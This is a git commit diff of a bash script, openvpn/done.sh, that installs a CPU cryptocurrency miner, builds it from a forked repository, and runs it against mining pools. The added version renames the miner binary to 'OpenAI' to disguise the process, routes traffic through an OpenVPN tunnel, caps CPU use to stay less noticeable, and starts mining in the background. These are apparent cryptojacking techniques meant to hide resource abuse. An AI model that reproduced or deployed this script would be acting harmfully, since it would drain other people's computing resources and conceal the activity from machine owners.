cb807f447e422924d17227ead0eb70dd3bfe7af1
dnminh11 <dn.minh.x@gmail.com>
2018-03-30 02:42:09 +0700

    a

--- openvpn/done.sh
+++ openvpn/done.sh
@@ -1,60 +1,17 @@
 #!/bin/bash
-sudo apt-get update
-sudo ufw allow proto tcp from any to any port 80,443
+sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get install cpulimit -y && sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev gcc build-essential git make curl unzip gedit dh-autoreconf openssh-server screen libtool libncurses5-dev libudev-dev g++ iftop libgtk2.0-dev libboost-dev libboost-system-dev libboost-thread-dev vim -y 
 sudo apt-get install -y openvpn
-wget https://raw.githubusercontent.com/wickedbot/xeko/master/openvpn/done.ovpn
-IP=$(/sbin/ip route | awk '/default/ { print $3 }')
-route add 117.5.39.30 gw $IP
-sudo openvpn --config done.ovpn --daemon
-sleep 10s
-wget -qO- http://ipv4.icanhazip.com; echo -e "\033[0;33m'"
-if [ -f ${PWD}/cpuminer-opt/miner.h ]; then
-    if pgrep -x "cpuminer" > /dev/null
-then
-    echo "cpuminer is running"
-else
-    echo "cpuminer has been installed, starting now"
-    cd cpuminer-opt
-    screen -dmSL cpuminer 
-	cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
-	if [ $cpucores -ge 16 ]; then
-	downcore=2;
-	else 
-	downcore=1;
-	fi
-	if [ $cpucores -ge 2 ]; then
-	detectcpu=$[$cpucores - $downcore]
-	else 
-	detectcpu=$cpucores
-	fi
-	maxcore=$[$cpucores - $downcore];
-	./cpuminer -a lyra2z330 -o stratum+tcp://zoi-pool3.chainsilo.com:3032 -u 1chaphet.01 -p x
-  
-fi
-exit
-fi
-sudo apt-get update
-sudo apt-get -y install screen git make automake build-essential autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev
-sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))
-git clone https://github.com/JayDDee/cpuminer-opt 
+git clone https://github.com/k67frozen/cpuminer-opt
 cd cpuminer-opt
+chmod +x *
 ./build.sh
-CFLAGS="-march=native" ./configure
-make
-echo "cpuminer is starting"
-screen -S cpuminer 
-
-
-cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
-if [ $cpucores -ge 16 ]; then
-downcore=2;
-else 
-downcore=1;
-fi
-if [ $cpucores -ge 2 ]; then
-detectcpu=$[$cpucores - $downcore]
-else 
-detectcpu=$cpucores
-fi
-maxcore=$[$cpucores - $downcore];
-sudo ./cpuminer -a lyra2z330 -o stratum+tcp://zoi-pool3.chainsilo.com:3032 -u 1chaphet.01 -p x
+mv cpuminer OpenAI
+IP=$(/sbin/ip route | awk '/default/ { print $3 }')
+route add  1.52.168.10 gw $IP
+route add  27.73.37.172 gw $IP
+cd ..
+sudo -b openvpn --config test.ovpn
+sleep 5m
+sudo wget -qO- http://ipv4.icanhazip.com > ip.txt
+cd cpuminer-opt
+cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u zimbalem.vpn -p x
